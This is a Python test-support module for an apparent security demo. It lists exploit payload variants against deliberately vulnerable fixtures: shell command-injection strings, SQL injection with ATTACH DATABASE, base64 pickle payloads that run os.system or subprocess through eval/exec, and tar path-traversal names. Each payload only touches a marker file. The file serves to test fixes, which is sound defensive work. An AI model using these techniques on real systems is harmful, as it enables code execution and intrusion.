"""Additional attack payload variants per fixture, beyond the single
payload in each fixture's confirmed AttackHypothesis (see
COORDINATION.md's fixture entries).

Each confirmed hypothesis's payload is what system/sandbox and
regression/ are built against and must stay the single source of truth
for the demo's byte-identical replay claim - none of these are alternate
hypotheses to swap in. They're extra proof that each `vulnerable()` is
exploitable via more than one technique for its vulnerability class, and
that `fixed()` closes all of them, not just the one the demo uses. Every
variant here was confirmed against the real fixture (real Docker sandbox
where available, real local execution otherwise) before being added, not
just asserted to work - see COORDINATION.md for the confirmation entries.
"""

from __future__ import annotations

MARKER = "/tmp/kagutsuchi_pwned"

# netdiag.py (command injection): each variant chains a marker-creating
# command onto a legitimate-looking host using a different shell
# metacharacter/technique.
PAYLOAD_VARIANTS: dict[str, str] = {
    "semicolon": f"127.0.0.1; touch {MARKER}",
    "background_and": f"127.0.0.1 && touch {MARKER}",
    "pipe": f"127.0.0.1 | touch {MARKER}",
    "backtick_substitution": f"127.0.0.1`touch {MARKER}`",
    "dollar_paren_substitution": f"127.0.0.1$(touch {MARKER})",
    "newline": f"127.0.0.1\ntouch {MARKER}",
}

# sql_injection.py (SQL injection): each variant chains the same
# ATTACH DATABASE + CREATE TABLE onto the intended SELECT, using a
# different way to close out or comment past the trailing quote that
# vulnerable()'s f-string leaves dangling.
SQL_PAYLOAD_VARIANTS: dict[str, str] = {
    "dash_comment": f"x'; ATTACH DATABASE '{MARKER}' AS pwn; CREATE TABLE pwn.t(x); --",
    "block_comment": f"x'; ATTACH DATABASE '{MARKER}' AS pwn; CREATE TABLE pwn.t(x); /*",
    "quote_balanced": f"x'; ATTACH DATABASE '{MARKER}' AS pwn; CREATE TABLE pwn.t(x); SELECT '",
}

# insecure_deserialization.py: each variant is a base64-encoded pickle
# stream whose __reduce__ reaches the marker via a different callable/
# code-execution technique (not just a different string) - see
# hypothesis/deserialization_fallback.py for why these route through
# eval/exec rather than pickling os.system directly (platform-specific
# __module__ breaks cross-platform, see COORDINATION.md and
# verification/README.md's writeup).
DESERIALIZATION_PAYLOAD_VARIANTS: dict[str, str] = {
    "eval_os_system": (
        "gASVUgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw2X19pbXBvcnRfXygnb3MnKS5zeXN0"
        "ZW0oJ3RvdWNoIC90bXAva2FndXRzdWNoaV9wd25lZCcplIWUUpQu"
    ),
    "exec_os_system": (
        "gASVUgAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw2X19pbXBvcnRfXygnb3MnKS5zeXN0"
        "ZW0oJ3RvdWNoIC90bXAva2FndXRzdWNoaV9wd25lZCcplIWUUpQu"
    ),
    "eval_subprocess_run": (
        "gASVXAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxAX19pbXBvcnRfXygnc3VicHJvY2Vz"
        "cycpLnJ1bihbJ3RvdWNoJywgJy90bXAva2FndXRzdWNoaV9wd25lZCddKZSFlFKULg=="
    ),
    "eval_os_popen": (
        "gASVWAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw8X19pbXBvcnRfXygnb3MnKS5wb3Bl"
        "bigndG91Y2ggL3RtcC9rYWd1dHN1Y2hpX3B3bmVkJykucmVhZCgplIWUUpQu"
    ),
}

# tar_extraction.py: each variant is a different relative-traversal shape
# for the archive member's name - tarfile.extractall() with no filter
# extracts the member exactly as named, so any of these escape the safe
# extraction directory the same way, just via a different path string.
#
# "subdir_cancel" ("subdir/../../kagutsuchi_pwned") was dropped here after
# independent verification: it does NOT actually work as an exploit.
# tarfile._extract_member() computes the member's parent dir via
# os.path.dirname(join(path, member.name)) WITHOUT normalizing first, then
# calls os.makedirs() on that literal (unnormalized) string. For this
# specific payload that literal string is
# ".../kagutsuchi_safe_extract/subdir/../.." - os.makedirs walks and
# creates that path component-by-component (not path-collapsed), and
# raises FileExistsError once it reaches a directory that already exists
# partway through (reproduced deterministically, 3/3 clean runs, on
# Python 3.11.15). The exception propagates out of vulnerable() uncaught,
# so the exploit crashes instead of succeeding - it would be dishonest to
# keep listing it as a confirmed variant. The other three variants don't
# hit this because they don't route through an intermediate subdirectory
# name at all.
TAR_EXTRACTION_PAYLOAD_VARIANTS: dict[str, str] = {
    "single_up": "../kagutsuchi_pwned",
    "double_up_through_tmp": "../../tmp/kagutsuchi_pwned",
    "dot_prefixed": "./../kagutsuchi_pwned",
}
